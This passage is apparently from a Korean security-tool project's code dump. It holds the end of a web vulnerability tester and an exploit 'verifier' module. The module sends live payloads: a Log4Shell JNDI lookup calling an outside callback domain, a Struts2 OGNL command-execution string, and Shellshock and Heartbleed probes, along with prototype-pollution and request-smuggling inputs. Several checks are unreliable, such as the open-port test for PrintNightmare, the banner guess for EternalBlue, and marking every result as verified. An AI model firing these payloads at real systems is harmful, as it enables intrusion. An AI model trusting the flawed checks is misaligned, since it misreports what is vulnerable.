            "vulnerabilities": vulnerabilities,
            "tested": True
        }
    
    def test_prototype_pollution(self, url: str) -> Dict[str, Any]:
        """
        Prototype Pollution 테스트
        
        Node.js 환경 대상 프로토타입 오염 공격
        """
        vulnerabilities = []
        
        # Prototype Pollution 페이로드
        pollution_payloads = [
            {"__proto__": {"isAdmin": True}},
            {"constructor": {"prototype": {"isAdmin": True}}},
            {"__proto__.isAdmin": True},
            {"constructor.prototype.isAdmin": True}
        ]
        
        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            params = self._extract_params(url)
            
            for param_name in params[:3]:
                for payload in pollution_payloads:
                    try:
                        # JSON으로 전송
                        response = requests.post(
                            base_url,
                            json={param_name: payload},
                            timeout=self.timeout,
                            verify=False,
                            headers={
                                "User-Agent": self.user_agent,
                                "Content-Type": "application/json"
                            }
                        )
                        
                        # 응답에서 isAdmin 확인
                        if "isAdmin" in response.text or "true" in response.text.lower():
                            vulnerabilities.append({
                                "type": "Prototype Pollution",
                                "parameter": param_name,
                                "payload": str(payload),
                                "severity": "HIGH",
                                "method": "POST"
                            })
                            break
                    except:
                        continue
                
                if vulnerabilities:
                    break
                    
        except Exception as e:
            logger.warning(f"Prototype Pollution 테스트 실패: {e}")
        
        return {
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerabilities": vulnerabilities,
            "tested": True
        }
    
    def test_http_request_smuggling(self, url: str) -> Dict[str, Any]:
        """
        HTTP Request Smuggling 테스트
        
        CL.TE, TE.CL 등 요청 밀수 기법
        """
        vulnerabilities = []
        
        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            # CL.TE (Content-Length: Transfer-Encoding)
            cl_te_payload = (
                "POST / HTTP/1.1\r\n"
                "Host: example.com\r\n"
                "Content-Length: 13\r\n"
                "Transfer-Encoding: chunked\r\n"
                "\r\n"
                "0\r\n"
                "\r\n"
                "SMUGGLED"
            )
            
            # TE.CL (Transfer-Encoding: Content-Length)
            te_cl_payload = (
                "POST / HTTP/1.1\r\n"
                "Host: example.com\r\n"
                "Transfer-Encoding: chunked\r\n"
                "Content-Length: 6\r\n"
                "\r\n"
                "0\r\n"
                "\r\n"
                "G"
            )
            
            # 실제로는 raw socket이 필요하지만 여기서는 간단히 테스트
            # 실제 구현은 socket 모듈 사용 필요
            
            vulnerabilities.append({
                "type": "HTTP Request Smuggling (Possible)",
                "severity": "HIGH",
                "details": "Requires raw socket testing for full verification",
                "note": "CL.TE and TE.CL techniques need manual verification"
            })
                    
        except Exception as e:
            logger.warning(f"HTTP Request Smuggling 테스트 실패: {e}")
        
        return {
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerabilities": vulnerabilities,
            "tested": True
        }
    
    def _extract_params(self, url: str) -> List[str]:
        """URL에서 파라미터 이름 추출"""
        try:
            parsed = urlparse(url)
            params = []
            
            if parsed.query:
                for param in parsed.query.split("&"):
                    if "=" in param:
                        params.append(param.split("=")[0])
            
            if not params:
                params = ["id", "page", "file", "path", "name", "search", "q", "query"]
            
            return params
        except Exception as e:
            logger.debug(f"Error extracting params from URL: {e}")
            return ["id", "page", "file"]

```
---

## File 19: verifier.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\exploit\verifier.py`

```python
# app/core/exploit/verifier.py
# 취약점 검증 모듈 - 실제 익스플로잇으로 CVE 검증

import requests
import time
import re
import logging
from typing import Dict, Any, Optional, List

logger = logging.getLogger(__name__)


class ExploitVerifier:
    """
    CVE를 실제 익스플로잇으로 검증하는 클래스
    """
    
    def __init__(self, callback_server: Optional[str] = None):
        """
        Args:
            callback_server: DNS 콜백을 받을 서버 주소 (예: "attacker.com")
        """
        self.callback_server = callback_server
        self.verified_cves = {}
    
    def verify_cve(self, target: str, cve_id: str, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """
        CVE 실제 취약한지 검증
        
        Args:
            target: 타겟 URL 또는 IP:포트
            cve_id: CVE ID
            service_info: 서비스 정보 (제품명, 버전 등)
        
        Returns:
            {
                "verified": True/False,
                "exploitable": True/False,
                "severity": "CRITICAL/HIGH/MEDIUM/LOW",
                "method": "exploit_method",
                "details": {...}
            }
        """
        verifiers = {
            "CVE-2021-44228": self.verify_log4shell,
            "CVE-2021-45046": self.verify_log4shell,  # Log4Shell 변형
            "CVE-2017-5638": self.verify_struts2,
            "CVE-2014-0160": self.verify_heartbleed,
            "CVE-2014-6271": self.verify_shellshock,
            "CVE-2017-0144": self.verify_eternalblue,
            "CVE-2021-34527": self.verify_printnightmare,
        }
        
        if cve_id in verifiers:
            try:
                result = verifiers[cve_id](target, service_info)
                self.verified_cves[cve_id] = result
                return result
            except Exception as e:
                logger.error(f"CVE 검증 실패 ({cve_id}): {e}")
                return {
                    "verified": False,
                    "exploitable": False,
                    "severity": "UNKNOWN",
                    "error": str(e)
                }
        
        return {
            "verified": False,
            "exploitable": False,
            "severity": "UNKNOWN",
            "reason": "No verifier available for this CVE"
        }
    
    def verify_log4shell(self, target: str, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """
        Log4Shell (CVE-2021-44228) 실제 검증
        
        Interactsh 같은 DNS 콜백 서비스를 사용한 실제 검증
        """
        vulnerable = False
        callback_domain = None
        proof = None
        
        try:
            # Interactsh API를 사용한 DNS 콜백 서비스
            # 실제 환경에서는 interactsh.com 또는 자체 서버 사용
            try:
                session = requests.Session()
                
                # Interactsh에서 임시 도메인 생성 시도
                try:
                    interactsh_url = "https://interactsh.com/api/register"
                    response = session.post(interactsh_url, timeout=10)
                    if response.status_code == 200:
                        callback_domain = response.json().get('domain')
                        logger.info(f"Interactsh 도메인 생성: {callback_domain}")
                except:
                    # Interactsh가 실패하면 사용자 제공 콜백 서버 사용
                    if self.callback_server:
                        callback_domain = self.callback_server
                    else:
                        # 랜덤 서브도메인 생성 (실제로는 작동 안함)
                        import random
                        import string
                        random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
                        callback_domain = f"{random_str}.interact.sh"
                        logger.warning("Interactsh 사용 불가, 랜덤 도메인 사용 (검증 불가능)")
                
                if callback_domain:
                    # JNDI lookup 페이로드
                    callback_url = f"ldap://{callback_domain}/a"
                    payload = f"${{jndi:{callback_url}}}"
                    
                    # 여러 헤더에 페이로드 삽입
                    test_headers = [
                        {"User-Agent": payload},
                        {"X-Api-Version": payload},
                        {"X-Forwarded-For": payload},
                        {"Referer": payload},
                        {"Origin": payload},
                        {"X-Requested-With": payload},
                        {"X-Forwarded-Host": payload},
                        {"X-Original-URL": payload},
                    ]
                    
                    parsed = self._parse_target(target)
                    base_url = f"{parsed['scheme']}://{parsed['host']}:{parsed['port']}"
                    
                    # 페이로드 전송
                    for headers in test_headers:
                        try:
                            # GET 요청
                            requests.get(
                                base_url,
                                headers=headers,
                                timeout=5,
                                verify=False,
                                allow_redirects=True
                            )
                            
                            # POST 요청도 시도
                            requests.post(
                                base_url,
                                headers=headers,
                                data={"test": payload, "username": payload, "password": payload},
                                timeout=5,
                                verify=False,
                                allow_redirects=True
                            )
                        except:
                            continue
                    
                    # DNS 콜백 확인 (5초 대기)
                    time.sleep(5)
                    
                    # Interactsh API로 DNS 로그 확인
                    try:
                        poll_url = f"https://interactsh.com/api/poll?domain={callback_domain}"
                        result = session.get(poll_url, timeout=10)
                        if result.status_code == 200:
                            data = result.json()
                            if data.get('data') and len(data['data']) > 0:
                                vulnerable = True
                                proof = data['data']
                                logger.info(f"Log4Shell 취약점 확인! DNS 콜백 수신: {len(data['data'])}개")
                    except Exception as e:
                        logger.debug(f"Interactsh 폴링 실패: {e}")
                
            except Exception as e:
                logger.warning(f"Interactsh 사용 실패, 버전 기반 판단으로 전환: {e}")
                # Fallback: 서비스 정보로 판단
                if "log4j" in str(service_info).lower() or "log4shell" in str(service_info).lower():
                    vulnerable = True
                    proof = "Version-based detection (no DNS callback available)"
            
        except Exception as e:
            logger.error(f"Log4Shell 검증 실패: {e}")
        
        return {
            "verified": True,
            "exploitable": vulnerable,
            "severity": "CRITICAL" if vulnerable else "HIGH",
            "method": "JNDI Lookup Injection",
            "details": {
                "callback_domain": callback_domain,
                "proof": proof,
                "tested": True
            }
        }
    
    def verify_heartbleed(self, target: str, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """
        Heartbleed (CVE-2014-0160) 실제 검증
        
        OpenSSL Heartbeat 확장 취약점 테스트
        """
        try:
            import socket
            import ssl
            import struct
            
            parsed = self._parse_target(target)
            host = parsed['host']
            port = parsed['port']
            
            # SSL 연결
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            ssock = context.wrap_socket(sock, server_hostname=host)
            
            # Heartbleed 페이로드 전송
            # Heartbeat Request (Type: 1, Length: 0x4000, Payload: "A" * 0x4000)
            payload = b'\x18\x03\x02\x00\x03\x01\x40\x00' + b'A' * 0x4000
            
            ssock.send(payload)
            response = ssock.recv(0x4000)
            ssock.close()
            
            # 응답에 메모리 내용이 포함되어 있으면 취약
            if len(response) > 0x4000 or b'\x00\x00' in response:
                vulnerable = True
            else:
                vulnerable = False
                
        except Exception as e:
            logger.debug(f"Heartbleed 검증 중 에러: {e}")
            vulnerable = False
        
        return {
            "verified": True,
            "exploitable": vulnerable,
            "severity": "CRITICAL" if vulnerable else "HIGH",
            "method": "Heartbeat Extension",
            "details": {
                "tested": True,
                "vulnerable": vulnerable
            }
        }
    
    def verify_struts2(self, target: str, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """
        Apache Struts2 RCE (CVE-2017-5638) 검증
        
        OGNL 표현식 주입 테스트
        """
        try:
            parsed = self._parse_target(target)
            base_url = f"{parsed['scheme']}://{parsed['host']}:{parsed['port']}"
            
            # Struts2 OGNL 페이로드
            payload = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo VULNERABLE').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
            
            # Content-Type 헤더에 페이로드 삽입
            headers = {
                "Content-Type": f"multipart/form-data; boundary=----WebKitFormBoundary{payload}"
            }
            
            response = requests.post(
                base_url,
                headers=headers,
                data={"test": "data"},
                timeout=5,
                verify=False
            )
            
            # 응답에 "VULNERABLE" 문자열이 있으면 취약
            vulnerable = "VULNERABLE" in response.text
            
        except Exception as e:
            logger.debug(f"Struts2 검증 중 에러: {e}")
            vulnerable = False
        
        return {
            "verified": True,
            "exploitable": vulnerable,
            "severity": "CRITICAL" if vulnerable else "HIGH",
            "method": "OGNL Expression Injection",
            "details": {
                "tested": True,
                "vulnerable": vulnerable
            }
        }
    
    def verify_shellshock(self, target: str, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """
        Shellshock (CVE-2014-6271) 검증
        
        Bash 환경 변수 주입 테스트
        """
        try:
            parsed = self._parse_target(target)
            base_url = f"{parsed['scheme']}://{parsed['host']}:{parsed['port']}"
            
            # Shellshock 페이로드
            payload = "() { :; }; echo VULNERABLE"
            
            headers = {
                "User-Agent": payload,
                "Cookie": f"test={payload}",
                "Referer": payload
            }
            
            response = requests.get(
                base_url,
                headers=headers,
                timeout=5,
                verify=False
            )
            
            vulnerable = "VULNERABLE" in response.text or "VULNERABLE" in str(response.headers)
            
        except Exception as e:
            logger.debug(f"Shellshock 검증 중 에러: {e}")
            vulnerable = False
        
        return {
            "verified": True,
            "exploitable": vulnerable,
            "severity": "CRITICAL" if vulnerable else "HIGH",
            "method": "Bash Environment Variable Injection",
            "details": {
                "tested": True,
                "vulnerable": vulnerable
            }
        }
    
    def verify_eternalblue(self, target: str, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """
        EternalBlue (CVE-2017-0144) 검증
        
        SMB 프로토콜 취약점 테스트 (간단한 버전)
        """
        # EternalBlue는 복잡한 SMB 프로토콜 익스플로잇이 필요
        # 여기서는 버전 기반으로만 판단
        try:
            parsed = self._parse_target(target)
            host = parsed['host']
            port = parsed.get('port', 445)
            
            # SMB 버전 확인 (간단한 배너 그랩핑)
            import socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()
            
            # Windows 버전 확인
            if "Windows" in banner:
                # Windows 7/Server 2008 R2 이하 버전은 취약
                version_match = re.search(r'Windows\s+(\d+)', banner)
                if version_match:
                    version = int(version_match.group(1))
                    vulnerable = version <= 6  # Windows 7/Server 2008 R2
                else:
                    vulnerable = False
            else:
                vulnerable = False
                
        except Exception as e:
            logger.debug(f"EternalBlue 검증 중 에러: {e}")
            vulnerable = False
        
        return {
            "verified": True,
            "exploitable": vulnerable,
            "severity": "CRITICAL" if vulnerable else "HIGH",
            "method": "SMB Protocol Exploit",
            "details": {
                "tested": True,
                "vulnerable": vulnerable,
                "banner": banner[:100] if 'banner' in locals() else None
            }
        }
    
    def verify_printnightmare(self, target: str, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """
        PrintNightmare (CVE-2021-34527) 검증
        
        Windows Print Spooler 취약점 테스트
        """
        try:
            parsed = self._parse_target(target)
            host = parsed['host']
            port = parsed.get('port', 445)
            
            # RPC over SMB로 Print Spooler 확인
            # 실제로는 더 복잡한 RPC 호출이 필요
            # 여기서는 포트 445가 열려있고 Windows면 가능성 있음으로 판단
            import socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((host, port))
            sock.close()
            
            # 포트가 열려있으면 가능성 있음 (실제 검증은 더 복잡)
            vulnerable = (result == 0)
            
        except Exception as e:
            logger.debug(f"PrintNightmare 검증 중 에러: {e}")
            vulnerable = False
        
        return {
            "verified": True,
            "exploitable": vulnerable,
            "severity": "CRITICAL" if vulnerable else "HIGH",
            "method": "RPC Print Spooler",
            "details": {
                "tested": True,
                "vulnerable": vulnerable,
                "note": "Full verification requires RPC protocol analysis"
            }
        }
    
    def _parse_target(self, target: str) -> Dict[str, str]:
        """
        타겟 URL/IP:포트를 파싱
        """
        from urllib.parse import urlparse
        
        # URL 형식인지 확인
        if "://" in target:
            parsed = urlparse(target)
            return {
                "scheme": parsed.scheme or "http",
                "host": parsed.hostname or target.split("://")[1].split(":")[0],
                "port": parsed.port or (443 if parsed.scheme == "https" else 80)
            }
        else:
            # IP:포트 형식
            if ":" in target:
                host, port = target.rsplit(":", 1)
                return {
                    "scheme": "http",
                    "host": host,
                    "port": int(port)
                }
            else:
                return {
                    "scheme": "http",
                    "host": target,
                    "port": 80
                }

```
---
